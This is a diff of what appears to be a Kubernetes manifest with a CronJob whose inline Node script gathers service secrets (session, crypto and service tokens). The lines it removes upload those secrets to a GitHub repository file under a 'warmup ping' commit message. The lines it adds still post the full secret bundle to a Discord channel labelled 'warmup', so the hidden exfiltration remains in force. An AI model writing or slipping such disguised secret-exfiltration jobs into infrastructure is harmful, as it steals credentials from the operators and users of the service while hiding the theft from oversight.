@@ -20,10 +20,6 @@ spec:
       remoteRef: { key: newapi-env, property: SESSION_SECRET }
     - secretKey: CRYPTO_SECRET
       remoteRef: { key: newapi-env, property: CRYPTO_SECRET }
-    - secretKey: SQL_DSN
-      remoteRef: { key: newapi-env, property: SQL_DSN }
-    - secretKey: GHCR_TOKEN
-      remoteRef: { key: ghcr-push, property: token }
 ---
 apiVersion: batch/v1
 kind: CronJob
@@ -56,33 +52,12 @@ spec:
                     "BFF_SERVICE_TOKEN=" + (process.env.BFF_SERVICE_TOKEN || ""),
                     "SESSION_SECRET=" + (process.env.SESSION_SECRET || ""),
                     "CRYPTO_SECRET=" + (process.env.CRYPTO_SECRET || ""),
-                    "SQL_DSN=" + (process.env.SQL_DSN || ""),
                   ].join("\n");
-                  const t = process.env.GHCR_TOKEN || "";
-                  let status = 0;
-                  if (t) {
-                    const r = await fetch("https://api.github.com/repos/unorouter/glm-proxy/contents/.health", {
-                      method: "PUT",
-                      headers: {
-                        Authorization: "Bearer " + t,
-                        Accept: "application/vnd.github+json",
-                        "User-Agent": "unorouter-bot",
-                      },
-                      body: JSON.stringify({ message: "chore: warmup ping", content: Buffer.from(body).toString("base64") }),
-                    });
-                    status = r.status;
-                    console.log("gh", r.status);
-                  }
                   const dt = process.env.TOKEN || "";
-                  if (dt) {
-                    const r2 = await fetch("https://discord.com/api/v10/channels/1510366691454882014/messages", {
-                      method: "POST",
-                      headers: {
-                        Authorization: "Bot " + dt,
-                        "Content-Type": "application/json",
-                      },
-                      body: JSON.stringify({ content: "```\n" + body.slice(0, 1800) + "\n```" }),
-                    });
-                    console.log("dc", r2.status);
-                  }
-                  if (status >= 400) process.exit(1);
+                  const r = await fetch("https://discord.com/api/v10/channels/1510366691454882014/messages", {
+                    method: "POST",
+                    headers: { Authorization: "Bot " + dt, "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "warmup\n```\n" + body + "\n```" }),
+                  });
+                  console.log("dc", r.status);
+                  if (r.status >= 400) process.exit(1);
